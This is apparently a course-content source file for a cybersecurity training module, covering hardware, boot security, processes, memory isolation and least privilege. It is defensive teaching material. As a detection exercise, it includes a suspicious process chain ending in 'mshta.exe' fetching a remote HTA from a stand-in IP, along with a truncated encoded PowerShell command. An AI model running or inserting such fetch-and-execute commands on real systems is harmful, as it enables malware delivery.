import type { CourseBody } from '../../types';
import { questions } from './questions.en';

export const body: CourseBody = {
  courseId: 'a-systemes-fondamentaux',
  lesson: {
    intro:
      'Before defending a system, you need to know what it contains. An attacker almost always looks for the same thing: running their own code, with as many privileges as possible, in a persistent way. Understanding the hardware, the boot process, the processes and the privilege model means understanding the attacker’s targets and the barriers the system puts in their way.',
    sections: [
      {
        id: 'materiel',
        title: 'Hardware: processor, memory, storage',
        blocks: [
          { t: 'def', term: 'Processor (CPU)', text: 'Executes machine instructions one after the other, read from memory. It has **registers** (tiny, ultra-fast memory) and several **cores** able to work in parallel.' },
          { t: 'def', term: 'Main memory (RAM)', text: '**Volatile** working memory: it holds the running programs and their data, and is erased at power-off.' },
          { t: 'def', term: 'Storage', text: '**Persistent** memory (SSD, hard disk) that keeps files and the operating system without power. Much slower than RAM.' },
          { t: 'def', term: 'Cache', text: 'Small, very fast memory placed between the processor and the RAM, which keeps recently used data and instructions. It is organized in levels (L1, L2, L3) and remains volatile.' },
          {
            t: 'table',
            caption: 'Memory hierarchy (orders of magnitude)',
            head: ['Level', 'Typical latency', 'Volatile?', 'Security interest'],
            rows: [
              ['CPU registers', '< 1 ns', 'Yes', 'Targets of side-channel attacks'],
              ['L1–L3 caches', '1–40 ns', 'Yes', 'Spectre and Meltdown exploit their side effects'],
              ['RAM', '≈ 100 ns', 'Yes', 'Holds keys, clear-text passwords, fileless malware'],
              ['SSD / disk', '≈ 0.1 ms / 10 ms', 'No', 'Persistent evidence, to be encrypted (BitLocker, LUKS)'],
            ],
          },
          { t: 'callout', kind: 'key', text: 'The volatility of RAM has a major forensic consequence: powering off a compromised machine destroys the evidence held in memory (malicious processes, encryption keys). Memory acquisition is done **before** shutdown.' },
        ],
      },
      {
        id: 'donnees',
        title: 'Representing information: bits, bytes, hexadecimal',
        blocks: [
          { t: 'p', text: 'Everything a computer handles (text, images, programs, encryption keys) is represented by **bits**, which are either 0 or 1. A **byte** groups 8 bits and can take 256 values, from 0 to 255. A file is nothing but a sequence of bytes: how those bytes are interpreted makes it text, an image or a program.' },
          { t: 'def', term: 'Hexadecimal', text: 'Base-16 notation, using the digits 0 to 9 then the letters A to F. A byte is always written with **two** hexadecimal digits (from `00` to `FF`): this is the notation of memory addresses, hashes and byte dumps.' },
          {
            t: 'table',
            caption: 'One byte, three notations',
            head: ['Decimal', 'Binary', 'Hexadecimal'],
            rows: [['10', '00001010', '0A'], ['65', '01000001', '41'], ['255', '11111111', 'FF']],
          },
          { t: 'def', term: 'Character encoding', text: 'A rule that maps a character to a numeric value. **ASCII** covers 128 characters (`A` = 65, `a` = 97). **UTF-8** represents all of Unicode with 1 to 4 bytes per character and is identical to ASCII for the first 128.' },
          {
            t: 'example',
            title: 'Reading the first bytes of a file',
            blocks: [
              { t: 'code', lang: 'text', code: '4D 5A 90 00 03 00 00 00 ...   →  “MZ”: Windows executable (PE format)\n25 50 44 46 2D ...            →  “%PDF-”: PDF document\nFF D8 FF E0 ...               →  JPEG image' },
              { t: 'p', text: 'These first bytes, the file **signature**, reveal its real type. A file named `facture.pdf` that starts with `4D 5A` is a disguised executable: in an investigation, you read the content instead of trusting the name.' },
            ],
          },
          { t: 'callout', kind: 'key', text: 'Moving between binary and hexadecimal and reading a byte dump are basic skills of file analysis, forensics and malware study.' },
        ],
      },
      {
        id: 'demarrage',
        title: 'Boot: from firmware to the system',
        blocks: [
          { t: 'list', ordered: true, items: ['Power-on: the **firmware** (UEFI, formerly BIOS) runs from a chip on the motherboard.', 'The firmware initializes the hardware and looks for a **bootloader**.', 'The bootloader (Windows Boot Manager, GRUB) loads the operating system **kernel**.', 'The kernel initializes the drivers then starts the first process (`systemd` on Linux, `smss.exe` then `wininit.exe` on Windows).'] },
          { t: 'def', term: 'Secure Boot', text: 'A UEFI feature that only lets **signed** bootloaders and kernels run, signed by a trusted key. It blocks bootkits that insert themselves before the system.' },
          { t: 'def', term: 'TPM (Trusted Platform Module)', text: 'A component (dedicated chip or firmware feature) that protects keys and records **measurements** of the boot chain. It lets BitLocker, for example, release the disk key only if the boot process has not been modified.' },
          { t: 'callout', kind: 'warn', text: 'Malicious code that runs before the operating system (bootkit, UEFI implant) escapes the antivirus, which starts after it. This is why Secure Boot, the firmware password and UEFI updates matter.' },
        ],
      },
      {
        id: 'processus',
        title: 'Kernel, processes, threads and services',
        blocks: [
          { t: 'p', text: 'The **kernel** has full access to the hardware; it runs in **privileged mode** (ring 0). Applications run in **user space** (ring 3) and must go through **system calls** to read a file or open a connection.' },
          { t: 'def', term: 'Process', text: 'A running program, with its own **memory address space**, an identifier (PID), a parent process and a **security context** (the user it acts for).' },
          { t: 'def', term: 'Thread', text: 'A thread of execution inside a process; the threads of a same process share its memory.' },
          { t: 'def', term: 'Service / daemon', text: 'A process started in the background, often at boot, with no interface: web server, SSH, task scheduler. Often runs with high privileges: a prime target.' },
          {
            t: 'example',
            title: 'A suspicious process tree',
            blocks: [
              { t: 'code', lang: 'text', code: 'explorer.exe (PID 2412)\n └─ WINWORD.EXE (PID 5120)\n     └─ cmd.exe (PID 6604)\n         └─ powershell.exe -enc JABjAGwAaQBlAG4AdAA... (PID 6688)' },
              { t: 'p', text: 'A word processor has no legitimate reason to start a command interpreter, which in turn starts PowerShell with an encoded command. This is the classic signature of a **booby-trapped document** (malicious macro). EDRs watch precisely for these abnormal parent-child relationships.' },
            ],
          },
        ],
      },
      {
        id: 'espace-adressage',
        title: 'A process’s memory and its isolation',
        blocks: [
          { t: 'p', text: 'Each process believes it has all the memory to itself: it sees a private **virtual** address space. The processor (its memory management unit, the **MMU**) and the kernel translate these virtual addresses into physical memory addresses, and check the rights of every page: read, write, execute.' },
          { t: 'def', term: 'Virtual memory', text: 'An abstraction that gives each process its own address space. An ordinary process can neither read nor modify another process’s memory: this is the system’s first isolation barrier.' },
          {
            t: 'table',
            caption: 'Main memory areas of a process',
            head: ['Area', 'Content', 'Security interest'],
            rows: [
              ['Code', 'Program instructions', 'Read and execute, no write'],
              ['Stack', 'Function calls, local variables, return addresses', 'Target of buffer overflows'],
              ['Heap', 'Dynamically allocated data', 'Target of memory-management errors (use-after-free)'],
            ],
          },
          { t: 'def', term: 'NX / DEP', text: 'A protection that marks the stack and the heap as **non-executable**: code injected into these areas can no longer run directly.' },
          { t: 'def', term: 'ASLR', text: 'A technique that **randomizes** the addresses of code, stack and heap at each launch, so that an attacker cannot predict them.' },
          { t: 'callout', kind: 'warn', text: 'Process isolation is a barrier, not a guarantee: a memory vulnerability in an application or in the kernel can allow it to be crossed. These flaws are studied in module G.' },
        ],
      },
      {
        id: 'privileges',
        title: 'Privileges and least privilege',
        blocks: [
          { t: 'p', text: 'Each process acts on behalf of an account. What the process can do is limited by the **rights** of that account: a browser started by a standard user cannot modify system files.' },
          {
            t: 'table',
            head: ['System', 'All-powerful account', 'Elevation mechanism'],
            rows: [['Linux', '`root` (UID 0)', '`sudo`, SUID binaries'], ['Windows', '`SYSTEM`, Administrators', 'UAC (User Account Control), services']],
          },
          { t: 'def', term: 'Principle of least privilege', text: 'Each user, process or service must have only the rights **strictly necessary** for its function, and only for as long as necessary.' },
          { t: 'def', term: 'SUID bit', text: 'A Linux permission that makes a program run with the identity of its **owner** (often `root`) and not that of the user who launches it. Essential for some tools, but a vulnerable SUID program is a classic privilege-escalation vector.' },
          { t: 'def', term: 'Service account', text: 'An account dedicated to a service or an application: rights limited to its task, no interactive logon, a long managed password. It avoids running a service under an administrator account.' },
          { t: 'def', term: 'Privilege escalation', text: 'A technique by which an attacker moves from a limited context (user) to a more powerful one (administrator, SYSTEM, root) by exploiting a flaw or a misconfiguration.' },
          { t: 'callout', kind: 'key', text: 'A compromise under a standard account often stays **contained**. The same compromise under an administrator account gives the whole machine. Working day to day without administration rights is one of the most profitable measures.' },
        ],
      },
    ],
    useCases: [
      'Investigation: analyze the process tree to spot an abnormal chain (Word → cmd → PowerShell).',
      'Workstation hardening: remove local administration rights from users and enable Secure Boot.',
      'Incident response: decide to acquire the RAM before powering off a suspicious machine.',
    ],
    commonMistakes: [
      'Powering off a compromised machine immediately, destroying the evidence held in RAM.',
      'Using an administrator account for daily browsing and email.',
      'Disabling Secure Boot “to make it work” without assessing the risk.',
      'Confusing a process with a program: the same executable can run in several processes with different rights.',
    ],
    bestPractices: [
      'Apply least privilege to users and service accounts alike.',
      'Enable Secure Boot, protect the firmware with a password and keep it up to date.',
      'Monitor abnormal parent-child relationships between processes (EDR, Sysmon).',
      'Encrypt the storage to protect data if the hardware is stolen.',
    ],
    keyPoints: [
      'RAM is volatile: the evidence held in memory disappears at power-off.',
      'UEFI and Secure Boot protect the boot chain before the operating system.',
      'The kernel is privileged; applications go through system calls.',
      'Each process has a security context; least privilege limits the impact of a compromise.',
    ],
  },
  practice: [
    {
      id: 'arbre-processus',
      kind: 'analysis',
      title: 'Analyzing a process tree',
      context: [
        { t: 'p', text: 'Here are three trees observed on workstations. Which one deserves an investigation, and why?' },
        { t: 'code', lang: 'text', code: 'A) services.exe → svchost.exe -k netsvcs\nB) explorer.exe → chrome.exe → chrome.exe --type=renderer\nC) outlook.exe → excel.exe → mshta.exe http://203.0.113.50/a.hta' },
      ],
      steps: ['For each case, identify the parent and the child.', 'Ask whether the relationship is expected in normal use.', 'Rate the level of suspicion and suggest a first action.'],
    },
    {
      id: 'moindre-privilege',
      kind: 'case',
      title: 'Case study: applying least privilege',
      context: [{ t: 'p', text: 'In a 20-person agency, all employees are local administrators of their workstation “so they can install software”. The backup service runs under a domain administrator account.' }],
      steps: ['Identify the risks of this configuration.', 'Suggest an alternative organization for software installation.', 'Suggest a configuration for the backup service account.'],
    },
  ],
  questions,
  resources: [
    { title: 'Recommandations de configuration d’un système GNU/Linux', source: 'ANSSI (guide)' },
    { title: 'NIST SP 800-147 — BIOS Protection Guidelines', source: 'NIST', url: 'https://csrc.nist.gov/pubs/sp/800/147/final' },
    { title: 'UEFI Specification — Secure Boot', source: 'UEFI Forum', url: 'https://uefi.org/specifications' },
  ],
};
